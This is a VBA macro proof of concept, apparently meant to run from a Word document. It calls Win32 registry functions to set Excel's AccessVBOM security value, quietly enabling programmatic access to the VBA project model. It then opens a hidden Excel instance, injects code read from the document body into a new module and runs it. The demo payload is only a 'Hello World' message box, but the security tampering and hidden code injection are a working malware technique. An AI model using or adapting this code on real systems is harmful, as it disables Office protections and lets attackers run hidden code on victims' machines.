Public Enum REG_TOPLEVEL_KEYS
 HKEY_CLASSES_ROOT = &H80000000
 HKEY_CURRENT_CONFIG = &H80000005
 HKEY_CURRENT_USER = &H80000001
 HKEY_DYN_DATA = &H80000006
 HKEY_LOCAL_MACHINE = &H80000002
 HKEY_PERFORMANCE_DATA = &H80000004
 HKEY_USERS = &H80000003
End Enum


Private Declare PtrSafe Function RegCreateKey Lib _
   "advapi32.dll" Alias "RegCreateKeyA" _
   (ByVal Hkey As Long, ByVal lpSubKey As _
   String, phkResult As Long) As Long

Private Declare PtrSafe Function RegCloseKey Lib _
   "advapi32.dll" (ByVal Hkey As Long) As Long

Private Declare PtrSafe Function RegSetValueEx Lib _
   "advapi32.dll" Alias "RegSetValueExA" _
   (ByVal Hkey As Long, ByVal _
   lpValueName As String, ByVal _
   Reserved As Long, ByVal dwType _
   As Long, lpData As Any, ByVal _
   cbData As Long) As Long

Private Const REG_DWORD = 4
Sub Execute()
    'Does the same thing as HelloWorld.vba but doesn't use WScript.Shell instead using Win32 API calls to modify the registry
    Dim result1 As Boolean
    Dim Ver As Variant
    Dim Path As String
    Ver = Application.Version
    Path = "SOFTWARE\Microsoft\Office\" & Ver & "\Excel\Security"
    result1 = WriteDWordToRegistry(HKEY_CURRENT_USER, Path, "AccessVBOM", 1)
    
    'Create the Excel Instance
    Dim objExcel As New Excel.Application
    Dim objBook As Excel.Workbook
    
    
    objExcel.Visible = False 'Visible is False by default but better safe than sorry
    Set objBook = objExcel.Workbooks.Add
    'exposes the VBA proejct
    Set xPro = objBook.VBProject
    Set Module = xPro.VBComponents.Add(vbext_ct_StdModule)
    'For this POC just read the VBA code from the body of the document
    Selection.WholeStory
    subroutine = Selection.Range.Text
    Module.CodeModule.AddFromString (subroutine)
    objExcel.Run ("Module1.HelloWorld")
    objBook.Close SaveChanges:=False
    objExcel.Quit

End Sub

Private Function WriteDWordToRegistry(Hkey As _
  REG_TOPLEVEL_KEYS, strPath As String, strValue As String, dwordValue As Long) As Boolean
 
'Modified from https://www.freevbcode.com/ShowCode.asp?ID=335
'WRITES A DWORD VALUE TO REGISTRY:
'PARAMETERS:
'Hkey: Top Level Key as defined by REG_TOPLEVEL_KEYS Enum (See Declarations)
'strPath: Full Path of Subkey (if path does not exist it will be created)
'strValue: ValueName
'dwordValue: Value of Key entry

'Returns: True if successful, false otherwise

'EXAMPLE:
'To set the value of HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security AccessVBOM
'WriteDWordToRegistry(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Office\16.0\Excel\Security", "AccessVBOM", 1)

Dim bAns As Boolean

On Error GoTo ErrorHandler
   Dim keyhand As Long
   Dim r As Long
   r = RegCreateKey(Hkey, strPath, keyhand)
   If r = 0 Then
        r = RegSetValueEx(keyhand, strValue, 0, _
           REG_DWORD, dwordValue, Len(dwordValue))
        r = RegCloseKey(keyhand)
    End If
    
   WriteDWordToRegistry = (r = 0)

Exit Function

ErrorHandler:
    WriteDWordToRegistry = False
    Exit Function
    
End Function

Sub HelloWorld()
    'Copy this Subroutine into the body of the Word document
    MsgBox("Hello World!")
End Sub